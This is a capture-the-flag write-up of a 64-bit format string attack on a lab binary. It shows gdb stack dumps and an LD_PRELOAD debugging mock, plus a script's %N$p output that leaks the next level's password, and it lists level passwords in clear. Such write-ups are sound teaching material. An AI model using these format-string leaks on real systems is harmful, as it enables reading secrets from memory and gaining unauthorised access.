# Level02 - 64 bits - Format string attack

## Local script usage

Requirements:

- `gdb-peda`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level02/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level02 | `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` |
| level03 | `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

We notice the vulnerable printf that does not use format string and print directly the variable `username`

For example:

```shell
~/level02
--[ Username: AAAA
--[ Password: BBBB
  AAAA does not have access!

~/level02
--[ Username: %s # <= Format string vulnerability
--[ Password: BBBB
*****************************************
BBBB does not have access!
```

Unfortunately it difficult to debug the stack because of `fopen`, `fread` and `fclose` that try to open, read and close the level03's flag.

We can use [LD_PRELOAD trick](http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/) to mock those functions.

(This step is not really necessary, but it is better to illustrate)

We wrote a file for this job: [debugHelper.c](./debugHelper.c)

We have to send the file with `scp` and then compile it.

```shell
# on local machine
scp -P $OR_PORT -r debugHelper.c level02@$OR_HOST:/tmp/debugHelper.c

# on remote machine
gcc -shared -fPIC -ldl debugHelper.c -o debugHelper.so
export LD_PRELOAD=/tmp/debugHelper.so
```

```shell
gdb-peda$ b*main+654 # before vulnerable printf
gdb-peda$ run < <(echo "BBBBBB\nCCCCCC")
telescope 25

[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe390 --> 0x7fffffffe598 --> 0x7fffffffe7f2 ("/home/users/level02/level02")
0008| 0x7fffffffe398 --> 0x1f7ff9f10
0016| 0x7fffffffe3a0 --> 0x434343434343 ('CCCCCC')
0024| 0x7fffffffe3a8 --> 0x0
0032| 0x7fffffffe3b0 --> 0x0
0040| 0x7fffffffe3b8 --> 0x0
0048| 0x7fffffffe3c0 --> 0x0
0056| 0x7fffffffe3c8 --> 0x0
0064| 0x7fffffffe3d0 --> 0x0
0072| 0x7fffffffe3d8 --> 0x0
0080| 0x7fffffffe3e0 --> 0x0
0088| 0x7fffffffe3e8 --> 0x0
0096| 0x7fffffffe3f0 --> 0x0
0104| 0x7fffffffe3f8 --> 0x0
0112| 0x7fffffffe400 --> 0x100000000
0120| 0x7fffffffe408 --> 0x0
0128| 0x7fffffffe410 ('A' <repeats 40 times>) # <=== fake Flag
0136| 0x7fffffffe418 ('A' <repeats 32 times>)
0144| 0x7fffffffe420 ('A' <repeats 24 times>)
0152| 0x7fffffffe428 ('A' <repeats 16 times>)
0160| 0x7fffffffe430 ("AAAAAAAA")
0168| 0x7fffffffe438 --> 0x0
0176| 0x7fffffffe440 --> 0x424242424242 ('BBBBBB')
0184| 0x7fffffffe448 --> 0x0
0192| 0x7fffffffe450 --> 0x0
[------------------------------------------------------------------------------]
```

We can see the fake flag at the address `0x7fffffffe410`.

As we don't know exactly the position of the the flag, we will use a format string attack to find the flag. We will test several position using a loop.

Lets run [our script](./script.sh)

```shell
./script.sh
  %00$p: %0$p                 | xxd -r | rev  =>
  %01$p: 0x7fffffffe970       | xxd -r | rev  =>
  %02$p: (nil)                | xxd -r | rev  =>
  %03$p: 0x70                 | xxd -r | rev  =>  p
  %04$p: 0x2a2a2a2a2a2a2a2a   | xxd -r | rev  =>  ********
  %05$p: 0x2a2a2a2a2a2a2a2a   | xxd -r | rev  =>  ********
  %06$p: 0x7fffffffeb68       | xxd -r | rev  =>
  %07$p: 0x1f7ff9a08          | xxd -r | rev  =>
  %08$p: 0x64726f7773736170   | xxd -r | rev  =>  password
  %19$p: (nil)                | xxd -r | rev  =>
  (...)
  %20$p: 0x100000000          | xxd -r | rev  =>
  %21$p: (nil)                | xxd -r | rev  =>
  %22$p: 0x756e505234376848   | xxd -r | rev  =>  Hh74RPnu
  %23$p: 0x45414a3561733951   | xxd -r | rev  =>  Q9sa5JAE
  %24$p: 0x377a7143574e6758   | xxd -r | rev  =>  XgNWCqz7
  %25$p: 0x354a35686e475873   | xxd -r | rev  =>  sXGnh5J5
  %26$p: 0x48336750664b394d   | xxd -r | rev  =>  M9KfPg3H

  It should be:  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
  (...)
```

We have something like 40 chars in a row. It should be the flag.

Lets try

```shell
~/level02
  ===== [ Secure Access System v1.0 ] =====
  /***************************************\
  | You must login to access this system. |
  \**************************************/
  --[ Username:
  --[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
  *****************************************
  Greetings, !
$ whoami
  level03
$ cat /home/users/level03/.pass
  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [LD_PRELOAD Trick](http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/)
- [LD_PRELOAD Trick (with call to real function)](https://catonmat.net/simple-ld-preload-tutorial-part-two)

- [Man exit](https://linux.die.net/man/3/exit)
- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man fclose](https://linux.die.net/man/3/fclose)
- [Man fopen](https://linux.die.net/man/3/fopen)
- [Man fread](https://linux.die.net/man/3/fread)
- [Man fwrite](https://linux.die.net/man/3/fwrite)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strncmp](https://linux.die.net/man/3/strncmp)
- [Man strcspn](https://linux.die.net/man/3/strcspn)
- [Man system](https://linux.die.net/man/3/system)
